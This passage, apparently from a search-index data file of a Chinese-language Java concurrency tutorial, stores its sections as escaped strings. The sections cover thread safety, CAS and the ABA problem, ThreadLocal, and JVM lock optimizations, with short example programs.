\u4E00\u4E2A\u5BF9\u8C61\u7684\u521D\u59CB\u5316\u5B8C\u6210\uFF08\u6784\u9020\u51FD\u6570\u6267\u884C\u7ED3\u675F\uFF09\u5148\u884C\u53D1\u751F\u4E8E\u5B83\u7684 finalize() \u65B9\u6CD5\u7684\u5F00\u59CB\u3002"},{header:"8. \u4F20\u9012\u6027",slug:"_8-\u4F20\u9012\u6027",content:"Transitivity \u5982\u679C\u64CD\u4F5C A \u5148\u884C\u53D1\u751F\u4E8E\u64CD\u4F5C B\uFF0C\u64CD\u4F5C B \u5148\u884C\u53D1\u751F\u4E8E\u64CD\u4F5C C\uFF0C\u90A3\u4E48\u64CD\u4F5C A \u5148\u884C\u53D1\u751F\u4E8E\u64CD\u4F5C C\u3002"},{header:"\u5341\u4E00\u3001\u7EBF\u7A0B\u5B89\u5168",slug:"\u5341\u4E00\u3001\u7EBF\u7A0B\u5B89\u5168",content:`\u591A\u4E2A\u7EBF\u7A0B\u4E0D\u7BA1\u4EE5\u4F55\u79CD\u65B9\u5F0F\u8BBF\u95EE\u67D0\u4E2A\u7C7B\uFF0C\u5E76\u4E14\u5728\u4E3B\u8C03\u4EE3\u7801\u4E2D\u4E0D\u9700\u8981\u8FDB\u884C\u540C\u6B65\uFF0C\u90FD\u80FD\u8868\u73B0\u6B63\u786E\u7684\u884C\u4E3A\u3002
\u7EBF\u7A0B\u5B89\u5168\u6709\u4EE5\u4E0B\u51E0\u79CD\u5B9E\u73B0\u65B9\u5F0F\uFF1A`},{header:"\u4E0D\u53EF\u53D8",slug:"\u4E0D\u53EF\u53D8",content:`\u4E0D\u53EF\u53D8\uFF08Immutable\uFF09\u7684\u5BF9\u8C61\u4E00\u5B9A\u662F\u7EBF\u7A0B\u5B89\u5168\u7684\uFF0C\u4E0D\u9700\u8981\u518D\u91C7\u53D6\u4EFB\u4F55\u7684\u7EBF\u7A0B\u5B89\u5168\u4FDD\u969C\u63AA\u65BD\u3002\u53EA\u8981\u4E00\u4E2A\u4E0D\u53EF\u53D8\u7684\u5BF9\u8C61\u88AB\u6B63\u786E\u5730\u6784\u5EFA\u51FA\u6765\uFF0C\u6C38\u8FDC\u4E5F\u4E0D\u4F1A\u770B\u5230\u5B83\u5728\u591A\u4E2A\u7EBF\u7A0B\u4E4B\u4E2D\u5904\u4E8E\u4E0D\u4E00\u81F4\u7684\u72B6\u6001\u3002\u591A\u7EBF\u7A0B\u73AF\u5883\u4E0B\uFF0C\u5E94\u5F53\u5C3D\u91CF\u4F7F\u5BF9\u8C61\u6210\u4E3A\u4E0D\u53EF\u53D8\uFF0C\u6765\u6EE1\u8DB3\u7EBF\u7A0B\u5B89\u5168\u3002
\u4E0D\u53EF\u53D8\u7684\u7C7B\u578B\uFF1A final \u5173\u952E\u5B57\u4FEE\u9970\u7684\u57FA\u672C\u6570\u636E\u7C7B\u578B
String
\u679A\u4E3E\u7C7B\u578B
Number \u90E8\u5206\u5B50\u7C7B\uFF0C\u5982 Long \u548C Double \u7B49\u6570\u503C\u5305\u88C5\u7C7B\u578B\uFF0CBigInteger \u548C BigDecimal \u7B49\u5927\u6570\u636E\u7C7B\u578B\u3002\u4F46\u540C\u4E3A Number \u7684\u539F\u5B50\u7C7B AtomicInteger \u548C AtomicLong \u5219\u662F\u53EF\u53D8\u7684\u3002 \u5BF9\u4E8E\u96C6\u5408\u7C7B\u578B\uFF0C\u53EF\u4EE5\u4F7F\u7528 Collections.unmodifiableXXX() \u65B9\u6CD5\u6765\u83B7\u53D6\u4E00\u4E2A\u4E0D\u53EF\u53D8\u7684\u96C6\u5408\u3002
public class ImmutableExample { public static void main(String[] args) { Map<String, Integer> map = new HashMap<>(); Map<String, Integer> unmodifiableMap = Collections.unmodifiableMap(map); unmodifiableMap.put("a", 1); }
}
Exception in thread "main" java.lang.UnsupportedOperationException at java.util.Collections$UnmodifiableMap.put(Collections.java:1457) at ImmutableExample.main(ImmutableExample.java:9)
Collections.unmodifiableXXX() \u5148\u5BF9\u539F\u59CB\u7684\u96C6\u5408\u8FDB\u884C\u62F7\u8D1D\uFF0C\u9700\u8981\u5BF9\u96C6\u5408\u8FDB\u884C\u4FEE\u6539\u7684\u65B9\u6CD5\u90FD\u76F4\u63A5\u629B\u51FA\u5F02\u5E38\u3002
public V put(K key, V value) { throw new UnsupportedOperationException();
}`},{header:"\u4E92\u65A5\u540C\u6B65",slug:"\u4E92\u65A5\u540C\u6B65",content:"synchronized \u548C ReentrantLock\u3002"},{header:"\u975E\u963B\u585E\u540C\u6B65",slug:"\u975E\u963B\u585E\u540C\u6B65",content:`\u4E92\u65A5\u540C\u6B65\u6700\u4E3B\u8981\u7684\u95EE\u9898\u5C31\u662F\u7EBF\u7A0B\u963B\u585E\u548C\u5524\u9192\u6240\u5E26\u6765\u7684\u6027\u80FD\u95EE\u9898\uFF0C\u56E0\u6B64\u8FD9\u79CD\u540C\u6B65\u4E5F\u79F0\u4E3A\u963B\u585E\u540C\u6B65\u3002
\u4E92\u65A5\u540C\u6B65\u5C5E\u4E8E\u4E00\u79CD\u60B2\u89C2\u7684\u5E76\u53D1\u7B56\u7565\uFF0C\u603B\u662F\u8BA4\u4E3A\u53EA\u8981\u4E0D\u53BB\u505A\u6B63\u786E\u7684\u540C\u6B65\u63AA\u65BD\uFF0C\u90A3\u5C31\u80AF\u5B9A\u4F1A\u51FA\u73B0\u95EE\u9898\u3002\u65E0\u8BBA\u5171\u4EAB\u6570\u636E\u662F\u5426\u771F\u7684\u4F1A\u51FA\u73B0\u7ADE\u4E89\uFF0C\u5B83\u90FD\u8981\u8FDB\u884C\u52A0\u9501\uFF08\u8FD9\u91CC\u8BA8\u8BBA\u7684\u662F\u6982\u5FF5\u6A21\u578B\uFF0C\u5B9E\u9645\u4E0A\u865A\u62DF\u673A\u4F1A\u4F18\u5316\u6389\u5F88\u5927\u4E00\u90E8\u5206\u4E0D\u5FC5\u8981\u7684\u52A0\u9501\uFF09\u3001\u7528\u6237\u6001\u6838\u5FC3\u6001\u8F6C\u6362\u3001\u7EF4\u62A4\u9501\u8BA1\u6570\u5668\u548C\u68C0\u67E5\u662F\u5426\u6709\u88AB\u963B\u585E\u7684\u7EBF\u7A0B\u9700\u8981\u5524\u9192\u7B49\u64CD\u4F5C\u3002
\u968F\u7740\u786C\u4EF6\u6307\u4EE4\u96C6\u7684\u53D1\u5C55\uFF0C\u6211\u4EEC\u53EF\u4EE5\u4F7F\u7528\u57FA\u4E8E\u51B2\u7A81\u68C0\u6D4B\u7684\u4E50\u89C2\u5E76\u53D1\u7B56\u7565\uFF1A\u5148\u8FDB\u884C\u64CD\u4F5C\uFF0C\u5982\u679C\u6CA1\u6709\u5176\u5B83\u7EBF\u7A0B\u4E89\u7528\u5171\u4EAB\u6570\u636E\uFF0C\u90A3\u64CD\u4F5C\u5C31\u6210\u529F\u4E86\uFF0C\u5426\u5219\u91C7\u53D6\u8865\u507F\u63AA\u65BD\uFF08\u4E0D\u65AD\u5730\u91CD\u8BD5\uFF0C\u76F4\u5230\u6210\u529F\u4E3A\u6B62\uFF09\u3002\u8FD9\u79CD\u4E50\u89C2\u7684\u5E76\u53D1\u7B56\u7565\u7684\u8BB8\u591A\u5B9E\u73B0\u90FD\u4E0D\u9700\u8981\u5C06\u7EBF\u7A0B\u963B\u585E\uFF0C\u56E0\u6B64\u8FD9\u79CD\u540C\u6B65\u64CD\u4F5C\u79F0\u4E3A\u975E\u963B\u585E\u540C\u6B65\u3002`},{header:"1. CAS",slug:"_1-cas",content:"\u4E50\u89C2\u9501\u9700\u8981\u64CD\u4F5C\u548C\u51B2\u7A81\u68C0\u6D4B\u8FD9\u4E24\u4E2A\u6B65\u9AA4\u5177\u5907\u539F\u5B50\u6027\uFF0C\u8FD9\u91CC\u5C31\u4E0D\u80FD\u518D\u4F7F\u7528\u4E92\u65A5\u540C\u6B65\u6765\u4FDD\u8BC1\u4E86\uFF0C\u53EA\u80FD\u9760\u786C\u4EF6\u6765\u5B8C\u6210\u3002\u786C\u4EF6\u652F\u6301\u7684\u539F\u5B50\u6027\u64CD\u4F5C\u6700\u5178\u578B\u7684\u662F\uFF1A\u6BD4\u8F83\u5E76\u4EA4\u6362\uFF08Compare-and-Swap\uFF0CCAS\uFF09\u3002CAS \u6307\u4EE4\u9700\u8981\u6709 3 \u4E2A\u64CD\u4F5C\u6570\uFF0C\u5206\u522B\u662F\u5185\u5B58\u5730\u5740 V\u3001\u65E7\u7684\u9884\u671F\u503C A \u548C\u65B0\u503C B\u3002\u5F53\u6267\u884C\u64CD\u4F5C\u65F6\uFF0C\u53EA\u6709\u5F53 V \u7684\u503C\u7B49\u4E8E A\uFF0C\u624D\u5C06 V \u7684\u503C\u66F4\u65B0\u4E3A B\u3002"},{header:"2. AtomicInteger",slug:"_2-atomicinteger",content:`J.U.C \u5305\u91CC\u9762\u7684\u6574\u6570\u539F\u5B50\u7C7B AtomicInteger \u7684\u65B9\u6CD5\u8C03\u7528\u4E86 Unsafe \u7C7B\u7684 CAS \u64CD\u4F5C\u3002
\u4EE5\u4E0B\u4EE3\u7801\u4F7F\u7528\u4E86 AtomicInteger \u6267\u884C\u4E86\u81EA\u589E\u7684\u64CD\u4F5C\u3002
private AtomicInteger cnt = new AtomicInteger(); public void add() { cnt.incrementAndGet();
}
\u4EE5\u4E0B\u4EE3\u7801\u662F incrementAndGet() \u7684\u6E90\u7801\uFF0C\u5B83\u8C03\u7528\u4E86 Unsafe \u7684 getAndAddInt() \u3002
public final int incrementAndGet() { return unsafe.getAndAddInt(this, valueOffset, 1) + 1;
}
\u4EE5\u4E0B\u4EE3\u7801\u662F getAndAddInt() \u6E90\u7801\uFF0Cvar1 \u6307\u793A\u5BF9\u8C61\u5185\u5B58\u5730\u5740\uFF0Cvar2 \u6307\u793A\u8BE5\u5B57\u6BB5\u76F8\u5BF9\u5BF9\u8C61\u5185\u5B58\u5730\u5740\u7684\u504F\u79FB\uFF0Cvar4 \u6307\u793A\u64CD\u4F5C\u9700\u8981\u52A0\u7684\u6570\u503C\uFF0C\u8FD9\u91CC\u4E3A 1\u3002\u901A\u8FC7 getIntVolatile(var1, var2) \u5F97\u5230\u65E7\u7684\u9884\u671F\u503C\uFF0C\u901A\u8FC7\u8C03\u7528 compareAndSwapInt() \u6765\u8FDB\u884C CAS \u6BD4\u8F83\uFF0C\u5982\u679C\u8BE5\u5B57\u6BB5\u5185\u5B58\u5730\u5740\u4E2D\u7684\u503C\u7B49\u4E8E var5\uFF0C\u90A3\u4E48\u5C31\u66F4\u65B0\u5185\u5B58\u5730\u5740\u4E3A var1+var2 \u7684\u53D8\u91CF\u4E3A var5+var4\u3002
\u53EF\u4EE5\u770B\u5230 getAndAddInt() \u5728\u4E00\u4E2A\u5FAA\u73AF\u4E2D\u8FDB\u884C\uFF0C\u53D1\u751F\u51B2\u7A81\u7684\u505A\u6CD5\u662F\u4E0D\u65AD\u7684\u8FDB\u884C\u91CD\u8BD5\u3002
public final int getAndAddInt(Object var1, long var2, int var4) { int var5; do { var5 = this.getIntVolatile(var1, var2); } while(!this.compareAndSwapInt(var1, var2, var5, var5 + var4)); return var5;
}`},{header:"3. ABA",slug:"_3-aba",content:`\u5982\u679C\u4E00\u4E2A\u53D8\u91CF\u521D\u6B21\u8BFB\u53D6\u7684\u65F6\u5019\u662F A \u503C\uFF0C\u5B83\u7684\u503C\u88AB\u6539\u6210\u4E86 B\uFF0C\u540E\u6765\u53C8\u88AB\u6539\u56DE\u4E3A A\uFF0C\u90A3 CAS \u64CD\u4F5C\u5C31\u4F1A\u8BEF\u8BA4\u4E3A\u5B83\u4ECE\u6765\u6CA1\u6709\u88AB\u6539\u53D8\u8FC7\u3002
J.U.C \u5305\u63D0\u4F9B\u4E86\u4E00\u4E2A\u5E26\u6709\u6807\u8BB0\u7684\u539F\u5B50\u5F15\u7528\u7C7B AtomicStampedReference \u6765\u89E3\u51B3\u8FD9\u4E2A\u95EE\u9898\uFF0C\u5B83\u53EF\u4EE5\u901A\u8FC7\u63A7\u5236\u53D8\u91CF\u503C\u7684\u7248\u672C\u6765\u4FDD\u8BC1 CAS \u7684\u6B63\u786E\u6027\u3002\u5927\u90E8\u5206\u60C5\u51B5\u4E0B ABA \u95EE\u9898\u4E0D\u4F1A\u5F71\u54CD\u7A0B\u5E8F\u5E76\u53D1\u7684\u6B63\u786E\u6027\uFF0C\u5982\u679C\u9700\u8981\u89E3\u51B3 ABA \u95EE\u9898\uFF0C\u6539\u7528\u4F20\u7EDF\u7684\u4E92\u65A5\u540C\u6B65\u53EF\u80FD\u4F1A\u6BD4\u539F\u5B50\u7C7B\u66F4\u9AD8\u6548\u3002`},{header:"\u65E0\u540C\u6B65\u65B9\u6848",slug:"\u65E0\u540C\u6B65\u65B9\u6848",content:"\u8981\u4FDD\u8BC1\u7EBF\u7A0B\u5B89\u5168\uFF0C\u5E76\u4E0D\u662F\u4E00\u5B9A\u5C31\u8981\u8FDB\u884C\u540C\u6B65\u3002\u5982\u679C\u4E00\u4E2A\u65B9\u6CD5\u672C\u6765\u5C31\u4E0D\u6D89\u53CA\u5171\u4EAB\u6570\u636E\uFF0C\u90A3\u5B83\u81EA\u7136\u5C31\u65E0\u987B\u4EFB\u4F55\u540C\u6B65\u63AA\u65BD\u53BB\u4FDD\u8BC1\u6B63\u786E\u6027\u3002"},{header:"1. \u6808\u5C01\u95ED",slug:"_1-\u6808\u5C01\u95ED",content:`\u591A\u4E2A\u7EBF\u7A0B\u8BBF\u95EE\u540C\u4E00\u4E2A\u65B9\u6CD5\u7684\u5C40\u90E8\u53D8\u91CF\u65F6\uFF0C\u4E0D\u4F1A\u51FA\u73B0\u7EBF\u7A0B\u5B89\u5168\u95EE\u9898\uFF0C\u56E0\u4E3A\u5C40\u90E8\u53D8\u91CF\u5B58\u50A8\u5728\u865A\u62DF\u673A\u6808\u4E2D\uFF0C\u5C5E\u4E8E\u7EBF\u7A0B\u79C1\u6709\u7684\u3002
public class StackClosedExample { public void add100() { int cnt = 0; for (int i = 0; i < 100; i++) { cnt++; } System.out.println(cnt); }
}
public static void main(String[] args) { StackClosedExample example = new StackClosedExample(); ExecutorService executorService = Executors.newCachedThreadPool(); executorService.execute(() -> example.add100()); executorService.execute(() -> example.add100()); executorService.shutdown();
}
100
100`},{header:"2. \u7EBF\u7A0B\u672C\u5730\u5B58\u50A8\uFF08Thread Local Storage\uFF09",slug:"_2-\u7EBF\u7A0B\u672C\u5730\u5B58\u50A8-thread-local-storage",content:`\u5982\u679C\u4E00\u6BB5\u4EE3\u7801\u4E2D\u6240\u9700\u8981\u7684\u6570\u636E\u5FC5\u987B\u4E0E\u5176\u4ED6\u4EE3\u7801\u5171\u4EAB\uFF0C\u90A3\u5C31\u770B\u770B\u8FD9\u4E9B\u5171\u4EAB\u6570\u636E\u7684\u4EE3\u7801\u662F\u5426\u80FD\u4FDD\u8BC1\u5728\u540C\u4E00\u4E2A\u7EBF\u7A0B\u4E2D\u6267\u884C\u3002\u5982\u679C\u80FD\u4FDD\u8BC1\uFF0C\u6211\u4EEC\u5C31\u53EF\u4EE5\u628A\u5171\u4EAB\u6570\u636E\u7684\u53EF\u89C1\u8303\u56F4\u9650\u5236\u5728\u540C\u4E00\u4E2A\u7EBF\u7A0B\u4E4B\u5185\uFF0C\u8FD9\u6837\uFF0C\u65E0\u987B\u540C\u6B65\u4E5F\u80FD\u4FDD\u8BC1\u7EBF\u7A0B\u4E4B\u95F4\u4E0D\u51FA\u73B0\u6570\u636E\u4E89\u7528\u7684\u95EE\u9898\u3002
\u7B26\u5408\u8FD9\u79CD\u7279\u70B9\u7684\u5E94\u7528\u5E76\u4E0D\u5C11\u89C1\uFF0C\u5927\u90E8\u5206\u4F7F\u7528\u6D88\u8D39\u961F\u5217\u7684\u67B6\u6784\u6A21\u5F0F\uFF08\u5982\u201C\u751F\u4EA7\u8005-\u6D88\u8D39\u8005\u201D\u6A21\u5F0F\uFF09\u90FD\u4F1A\u5C06\u4EA7\u54C1\u7684\u6D88\u8D39\u8FC7\u7A0B\u5C3D\u91CF\u5728\u4E00\u4E2A\u7EBF\u7A0B\u4E2D\u6D88\u8D39\u5B8C\u3002\u5176\u4E2D\u6700\u91CD\u8981\u7684\u4E00\u4E2A\u5E94\u7528\u5B9E\u4F8B\u5C31\u662F\u7ECF\u5178 Web \u4EA4\u4E92\u6A21\u578B\u4E2D\u7684\u201C\u4E00\u4E2A\u8BF7\u6C42\u5BF9\u5E94\u4E00\u4E2A\u670D\u52A1\u5668\u7EBF\u7A0B\u201D\uFF08Thread-per-Request\uFF09\u7684\u5904\u7406\u65B9\u5F0F\uFF0C\u8FD9\u79CD\u5904\u7406\u65B9\u5F0F\u7684\u5E7F\u6CDB\u5E94\u7528\u4F7F\u5F97\u5F88\u591A Web \u670D\u52A1\u7AEF\u5E94\u7528\u90FD\u53EF\u4EE5\u4F7F\u7528\u7EBF\u7A0B\u672C\u5730\u5B58\u50A8\u6765\u89E3\u51B3\u7EBF\u7A0B\u5B89\u5168\u95EE\u9898\u3002
\u53EF\u4EE5\u4F7F\u7528 java.lang.ThreadLocal \u7C7B\u6765\u5B9E\u73B0\u7EBF\u7A0B\u672C\u5730\u5B58\u50A8\u529F\u80FD\u3002
\u5BF9\u4E8E\u4EE5\u4E0B\u4EE3\u7801\uFF0Cthread1 \u4E2D\u8BBE\u7F6E threadLocal \u4E3A 1\uFF0C\u800C thread2 \u8BBE\u7F6E threadLocal \u4E3A 2\u3002\u8FC7\u4E86\u4E00\u6BB5\u65F6\u95F4\u4E4B\u540E\uFF0Cthread1 \u8BFB\u53D6 threadLocal \u4F9D\u7136\u662F 1\uFF0C\u4E0D\u53D7 thread2 \u7684\u5F71\u54CD\u3002
public class ThreadLocalExample { public static void main(String[] args) { ThreadLocal threadLocal = new ThreadLocal(); Thread thread1 = new Thread(() -> { threadLocal.set(1); try { Thread.sleep(1000); } catch (InterruptedException e) { e.printStackTrace(); } System.out.println(threadLocal.get()); threadLocal.remove(); }); Thread thread2 = new Thread(() -> { threadLocal.set(2); threadLocal.remove(); }); thread1.start(); thread2.start(); }
}
1
\u4E3A\u4E86\u7406\u89E3 ThreadLocal\uFF0C\u5148\u770B\u4EE5\u4E0B\u4EE3\u7801\uFF1A
public class ThreadLocalExample1 { public static void main(String[] args) { ThreadLocal threadLocal1 = new ThreadLocal(); ThreadLocal threadLocal2 = new ThreadLocal(); Thread thread1 = new Thread(() -> { threadLocal1.set(1); threadLocal2.set(1); }); Thread thread2 = new Thread(() -> { threadLocal1.set(2); threadLocal2.set(2); }); thread1.start(); thread2.start(); }
}
\u5B83\u6240\u5BF9\u5E94\u7684\u5E95\u5C42\u7ED3\u6784\u56FE\u4E3A\uFF1A
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/6782674c-1bfe-4879-af39-e9d722a95d39.png" width="500px">
\u6BCF\u4E2A Thread \u90FD\u6709\u4E00\u4E2A ThreadLocal.ThreadLocalMap \u5BF9\u8C61\u3002
/* ThreadLocal values pertaining to this thread. This map is maintained * by the ThreadLocal class. */
ThreadLocal.ThreadLocalMap threadLocals = null;
\u5F53\u8C03\u7528\u4E00\u4E2A ThreadLocal \u7684 set(T value) \u65B9\u6CD5\u65F6\uFF0C\u5148\u5F97\u5230\u5F53\u524D\u7EBF\u7A0B\u7684 ThreadLocalMap \u5BF9\u8C61\uFF0C\u7136\u540E\u5C06 ThreadLocal->value \u952E\u503C\u5BF9\u63D2\u5165\u5230\u8BE5 Map \u4E2D\u3002
public void set(T value) { Thread t = Thread.currentThread(); ThreadLocalMap map = getMap(t); if (map != null) map.set(this, value); else createMap(t, value);
}
get() \u65B9\u6CD5\u7C7B\u4F3C\u3002
public T get() { Thread t = Thread.currentThread(); ThreadLocalMap map = getMap(t); if (map != null) { ThreadLocalMap.Entry e = map.getEntry(this); if (e != null) { @SuppressWarnings("unchecked") T result = (T)e.value; return result; } } return setInitialValue();
}
ThreadLocal \u4ECE\u7406\u8BBA\u4E0A\u8BB2\u5E76\u4E0D\u662F\u7528\u6765\u89E3\u51B3\u591A\u7EBF\u7A0B\u5E76\u53D1\u95EE\u9898\u7684\uFF0C\u56E0\u4E3A\u6839\u672C\u4E0D\u5B58\u5728\u591A\u7EBF\u7A0B\u7ADE\u4E89\u3002
\u5728\u4E00\u4E9B\u573A\u666F (\u5C24\u5176\u662F\u4F7F\u7528\u7EBF\u7A0B\u6C60) \u4E0B\uFF0C\u7531\u4E8E ThreadLocal.ThreadLocalMap \u7684\u5E95\u5C42\u6570\u636E\u7ED3\u6784\u5BFC\u81F4 ThreadLocal \u6709\u5185\u5B58\u6CC4\u6F0F\u7684\u60C5\u51B5\uFF0C\u5E94\u8BE5\u5C3D\u53EF\u80FD\u5728\u6BCF\u6B21\u4F7F\u7528 ThreadLocal \u540E\u624B\u52A8\u8C03\u7528 remove()\uFF0C\u4EE5\u907F\u514D\u51FA\u73B0 ThreadLocal \u7ECF\u5178\u7684\u5185\u5B58\u6CC4\u6F0F\u751A\u81F3\u662F\u9020\u6210\u81EA\u8EAB\u4E1A\u52A1\u6DF7\u4E71\u7684\u98CE\u9669\u3002`},{header:"3. \u53EF\u91CD\u5165\u4EE3\u7801\uFF08Reentrant Code\uFF09",slug:"_3-\u53EF\u91CD\u5165\u4EE3\u7801-reentrant-code",content:`\u8FD9\u79CD\u4EE3\u7801\u4E5F\u53EB\u505A\u7EAF\u4EE3\u7801\uFF08Pure Code\uFF09\uFF0C\u53EF\u4EE5\u5728\u4EE3\u7801\u6267\u884C\u7684\u4EFB\u4F55\u65F6\u523B\u4E2D\u65AD\u5B83\uFF0C\u8F6C\u800C\u53BB\u6267\u884C\u53E6\u5916\u4E00\u6BB5\u4EE3\u7801\uFF08\u5305\u62EC\u9012\u5F52\u8C03\u7528\u5B83\u672C\u8EAB\uFF09\uFF0C\u800C\u5728\u63A7\u5236\u6743\u8FD4\u56DE\u540E\uFF0C\u539F\u6765\u7684\u7A0B\u5E8F\u4E0D\u4F1A\u51FA\u73B0\u4EFB\u4F55\u9519\u8BEF\u3002
\u53EF\u91CD\u5165\u4EE3\u7801\u6709\u4E00\u4E9B\u5171\u540C\u7684\u7279\u5F81\uFF0C\u4F8B\u5982\u4E0D\u4F9D\u8D56\u5B58\u50A8\u5728\u5806\u4E0A\u7684\u6570\u636E\u548C\u516C\u7528\u7684\u7CFB\u7EDF\u8D44\u6E90\u3001\u7528\u5230\u7684\u72B6\u6001\u91CF\u90FD\u7531\u53C2\u6570\u4E2D\u4F20\u5165\u3001\u4E0D\u8C03\u7528\u975E\u53EF\u91CD\u5165\u7684\u65B9\u6CD5\u7B49\u3002`},{header:"\u5341\u4E8C\u3001\u9501\u4F18\u5316",slug:"\u5341\u4E8C\u3001\u9501\u4F18\u5316",content:"\u8FD9\u91CC\u7684\u9501\u4F18\u5316\u4E3B\u8981\u662F\u6307 JVM \u5BF9 synchronized \u7684\u4F18\u5316\u3002"},{header:"\u81EA\u65CB\u9501",slug:"\u81EA\u65CB\u9501",content:`\u4E92\u65A5\u540C\u6B65\u8FDB\u5165\u963B\u585E\u72B6\u6001\u7684\u5F00\u9500\u90FD\u5F88\u5927\uFF0C\u5E94\u8BE5\u5C3D\u91CF\u907F\u514D\u3002\u5728\u8BB8\u591A\u5E94\u7528\u4E2D\uFF0C\u5171\u4EAB\u6570\u636E\u7684\u9501\u5B9A\u72B6\u6001\u53EA\u4F1A\u6301\u7EED\u5F88\u77ED\u7684\u4E00\u6BB5\u65F6\u95F4\u3002\u81EA\u65CB\u9501\u7684\u601D\u60F3\u662F\u8BA9\u4E00\u4E2A\u7EBF\u7A0B\u5728\u8BF7\u6C42\u4E00\u4E2A\u5171\u4EAB\u6570\u636E\u7684\u9501\u65F6\u6267\u884C\u5FD9\u5FAA\u73AF\uFF08\u81EA\u65CB\uFF09\u4E00\u6BB5\u65F6\u95F4\uFF0C\u5982\u679C\u5728\u8FD9\u6BB5\u65F6\u95F4\u5185\u80FD\u83B7\u5F97\u9501\uFF0C\u5C31\u53EF\u4EE5\u907F\u514D\u8FDB\u5165\u963B\u585E\u72B6\u6001\u3002
\u81EA\u65CB\u9501\u867D\u7136\u80FD\u907F\u514D\u8FDB\u5165\u963B\u585E\u72B6\u6001\u4ECE\u800C\u51CF\u5C11\u5F00\u9500\uFF0C\u4F46\u662F\u5B83\u9700\u8981\u8FDB\u884C\u5FD9\u5FAA\u73AF\u64CD\u4F5C\u5360\u7528 CPU \u65F6\u95F4\uFF0C\u5B83\u53EA\u9002\u7528\u4E8E\u5171\u4EAB\u6570\u636E\u7684\u9501\u5B9A\u72B6\u6001\u5F88\u77ED\u7684\u573A\u666F\u3002
\u5728 JDK 1.6 \u4E2D\u5F15\u5165\u4E86\u81EA\u9002\u5E94\u7684\u81EA\u65CB\u9501\u3002\u81EA\u9002\u5E94\u610F\u5473\u7740\u81EA\u65CB\u7684\u6B21\u6570\u4E0D\u518D\u56FA\u5B9A\u4E86\uFF0C\u800C\u662F\u7531\u524D\u4E00\u6B21\u5728\u540C\u4E00\u4E2A\u9501\u4E0A\u7684\u81EA\u65CB\u6B21\u6570\u53CA\u9501\u7684\u62E5\u6709\u8005\u7684\u72B6\u6001\u6765\u51B3\u5B9A\u3002`},{header:"\u9501\u6D88\u9664",slug:"\u9501\u6D88\u9664",content:`\u9501\u6D88\u9664\u662F\u6307\u5BF9\u4E8E\u88AB\u68C0\u6D4B\u51FA\u4E0D\u53EF\u80FD\u5B58\u5728\u7ADE\u4E89\u7684\u5171\u4EAB\u6570\u636E\u7684\u9501\u8FDB\u884C\u6D88\u9664\u3002
\u9501\u6D88\u9664\u4E3B\u8981\u662F\u901A\u8FC7\u9003\u9038\u5206\u6790\u6765\u652F\u6301\uFF0C\u5982\u679C\u5806\u4E0A\u7684\u5171\u4EAB\u6570\u636E\u4E0D\u53EF\u80FD\u9003\u9038\u51FA\u53BB\u88AB\u5176\u5B83\u7EBF\u7A0B\u8BBF\u95EE\u5230\uFF0C\u90A3\u4E48\u5C31\u53EF\u4EE5\u628A\u5B83\u4EEC\u5F53\u6210\u79C1\u6709\u6570\u636E\u5BF9\u5F85\uFF0C\u4E5F\u5C31\u53EF\u4EE5\u5C06\u5B83\u4EEC\u7684\u9501\u8FDB\u884C\u6D88\u9664\u3002
\u5BF9\u4E8E\u4E00\u4E9B\u770B\u8D77\u6765\u6CA1\u6709\u52A0\u9501\u7684\u4EE3\u7801\uFF0C\u5176\u5B9E\u9690\u5F0F\u7684\u52A0\u4E86\u5F88\u591A\u9501\u3002\u4F8B\u5982\u4E0B\u9762\u7684\u5B57\u7B26\u4E32\u62FC\u63A5\u4EE3\u7801\u5C31\u9690\u5F0F\u52A0\u4E86\u9501\uFF1A
public static String concatString(String s1, String s2, String s3) { return s1 + s2 + s3;
}
String \u662F\u4E00\u4E2A\u4E0D\u53EF\u53D8\u7684\u7C7B\uFF0C\u7F16\u8BD1\u5668\u4F1A\u5BF9 String \u7684\u62FC\u63A5\u81EA\u52A8\u4F18\u5316\u3002\u5728 JDK 1.5 \u4E4B\u524D\uFF0C\u4F1A\u8F6C\u5316\u4E3A StringBuffer \u5BF9\u8C61\u7684\u8FDE\u7EED append() \u64CD\u4F5C\uFF1A
public static String concatString(String s1, String s2, String s3) { StringBuffer sb = new StringBuffer(); sb.append(s1); sb.append(s2); sb.append(s3); return sb.toString();
}
\u6BCF\u4E2A append() \u65B9\u6CD5\u4E2D\u90FD\u6709\u4E00\u4E2A\u540C\u6B65\u5757\u3002\u865A\u62DF\u673A\u89C2\u5BDF\u53D8\u91CF sb\uFF0C\u5F88\u5FEB\u5C31\u4F1A\u53D1\u73B0\u5B83\u7684\u52A8\u6001\u4F5C\u7528\u57DF\u88AB\u9650\u5236\u5728 concatString() \u65B9\u6CD5\u5185\u90E8\u3002\u4E5F\u5C31\u662F\u8BF4\uFF0Csb \u7684\u6240\u6709\u5F15\u7528\u6C38\u8FDC\u4E0D\u4F1A\u9003\u9038\u5230 concatString() \u65B9\u6CD5\u4E4B\u5916\uFF0C\u5176\u4ED6\u7EBF\u7A0B\u65E0\u6CD5\u8BBF\u95EE\u5230\u5B83\uFF0C\u56E0\u6B64\u53EF\u4EE5\u8FDB\u884C\u6D88\u9664\u3002`},{header:"\u9501\u7C97\u5316",slug:"\u9501\u7C97\u5316",content:`\u5982\u679C\u4E00\u7CFB\u5217\u7684\u8FDE\u7EED\u64CD\u4F5C\u90FD\u5BF9\u540C\u4E00\u4E2A\u5BF9\u8C61\u53CD\u590D\u52A0\u9501\u548C\u89E3\u9501\uFF0C\u9891\u7E41\u7684\u52A0\u9501\u64CD\u4F5C\u5C31\u4F1A\u5BFC\u81F4\u6027\u80FD\u635F\u8017\u3002
